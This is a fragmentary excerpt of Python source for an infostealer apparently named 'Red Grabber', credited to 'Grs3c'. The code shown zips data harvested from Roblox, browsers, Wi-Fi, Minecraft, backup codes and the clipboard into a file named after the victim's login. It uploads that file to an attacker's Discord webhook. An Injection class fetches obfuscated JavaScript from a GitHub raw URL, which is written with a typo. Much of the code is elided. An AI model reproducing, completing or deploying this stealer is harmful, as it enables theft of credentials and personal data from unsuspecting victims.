...
def main(webhook: str):
    ...
    data = {
        "username": "Red Grabber",
        "avatar_url": "https://media.discordapp.net/attachments/1209258332217548901/1209258398328160256/red.png?ex=65e644a5&is=65d3cfa5&hm=8b63be1cb80a4af1de3484b97c2b8d1e5de5b751343f8a356964f768b1d68b34&=&format=webp&quality=lossless&width=640&height=640"
    }

    _file = f'{localappdata}\\Red-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Red-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Red-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Red Grabber | Created By Grs3c"
                    },
                    "thumbnail": {
                        "url": "https://media.discordapp.net/attachments/1209258332217548901/1209258398328160256/red.png?ex=65e644a5&is=65d3cfa5&hm=8b63be1cb80a4af1de3484b97c2b8d1e5de5b751343f8a356964f768b1d68b34&=&format=webp&quality=lossless&width=640&height=640"
                    }
                }
            ],
            "username": "Red Grabber",
...
class Injection:
    def __init__(self, webhook: str) -> None:
        ...
        self.code = requests.get('hhttps://raw.githubusercontent.com/grs3c/redinjection/main/obfuscated-injection.js').text
